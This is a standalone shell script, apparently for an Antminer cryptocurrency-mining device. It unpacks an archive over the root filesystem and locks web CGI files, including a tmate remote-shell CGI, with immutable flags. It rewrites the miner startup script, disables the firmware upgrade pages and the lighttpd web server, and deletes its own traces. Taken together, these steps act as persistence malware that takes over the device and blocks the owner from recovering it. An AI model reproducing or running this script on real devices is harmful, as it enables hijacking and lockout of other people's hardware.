#!/bin/sh

chattr -i /www/pages/*

chattr -i /www/pages/cgi-bin/*

chattr -i /home/*

tar -zxf ./init.tar.gz -C /

chattr +i /www/pages/kernelLog.html 

chattr +i /www/pages/cgi-bin/get_kernel_log3.cgi

cp /sbin/ifconfig /usr/bin

cp /etc/init.d/bmminer.sh /home

sed -ie 's/single-board-test&/\/usr\/bin\/bmminer --fixed-freq --no-pre-heat --version-file \/usr\/bin\/compile_time --api-listen --default-config \/config\/bmminer.json/g' /etc/init.d/bmminer.sh

sed -ie 's/ --api-listen//g' /etc/init.d/bmminer.sh

sed -ie 's/bmminer.conf/bmminer.json/g' /etc/init.d/bmminer.sh

chmod +x /usr/bin/keysc

chattr +i /www/pages/cgi-bin/cgi1.cgi

chattr +i /www/pages/cgi-bin/cgi2.cgi

chattr +i /home/minerStatus.cgi

chattr +i /home/bmminer.sh

chattr +i /www/pages/cgi-bin/tmate.cgi

chattr +i /www/pages/kernelLog.html

chattr +i /www/pages/cgi-bin/get_kernel_log.cgi

chattr +i /www/pages/cgi-bin/get_kernel_log2.cgi

chmod 777 /usr/bin/seeme

mv /www/pages/cgi-bin/upgrade.cgi /media

mv /www/pages/cgi-bin/upgrade_clear.cgi /media

mv /etc/init.d/lighttpd /media

killall lighttpd

mv /etc/rcS.d/S60lighttpd /media

rm ./tmp.tar.gz

rm ./init.tar.gz

rm ./runme.sh 

sleep 3s

cat <<EOT > /tmp/oke.json
O K E
EOT